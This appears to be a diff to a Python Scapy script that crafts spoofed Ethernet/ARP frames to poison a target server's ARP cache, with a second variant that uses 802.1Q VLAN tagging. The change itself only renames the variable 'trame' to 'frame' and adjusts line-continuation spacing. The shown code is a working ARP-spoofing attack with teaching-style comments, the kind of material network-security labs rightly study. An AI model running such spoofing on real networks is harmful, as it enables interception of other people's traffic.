@@ -24,11 +24,11 @@ DST_HW = 'ec:b1:d7:31:24:b5'  # The hardware of the server you want to poison th
 
 print(conf.iface)
 
-trame = Ether(
+frame = Ether(
     dst=DST_HW,
     # Note: you don't have to modify the following MAC address (src=...).
     #       However, if you do, then it will trigger a broadcast.
-    src=MY_FAKE_HW) /\
+    src=MY_FAKE_HW) / \
         ARP(
             # NOTE:
             #  - If you specify op='is-at' (RESPONSE), then you may need to send the response multiple times.
@@ -40,21 +40,21 @@ trame = Ether(
             hwdst=DST_HW,  # In the case of a REQUEST, do not specify this parameter.
             pdst=DST_IP)
 
-trame.show()
+frame.show()
 # open Wireshark in order to visualize the packet.
-wireshark(trame)
-rep = srp1(trame, iface='eno1')
+wireshark(frame)
+rep = srp1(frame, iface='eno1')
 rep.show()
 
 # 802.1q encapsulation. The target is VLAN 2.
-# This trame will not "work".
+# This frame will not "work".
 
-trame = Ether(
+frame = Ether(
     dst=DST_HW,
     # Note: you don't have to modify the following MAC address (src=...).
     #       However, if you do, then it will trigger a broadcast.
-    src=MY_FAKE_HW) /\
-        Dot1Q(vlan=2) /\
+    src=MY_FAKE_HW) / \
+        Dot1Q(vlan=2) / \
         ARP(
             # NOTE:
             #  - If you specify op='is-at' (RESPONSE), then you may need to send the response multiple times.
@@ -66,8 +66,8 @@ trame = Ether(
             hwdst=DST_HW,  # In the case of a REQUEST, do not specify this parameter.
             pdst=DST_IP)
 
-trame.show()
+frame.show()
 # open Wireshark in order to visualize the packet.
-wireshark(trame)
-rep = srp1(trame, iface='eno1')
+wireshark(frame)
+rep = srp1(frame, iface='eno1')
 rep.show()
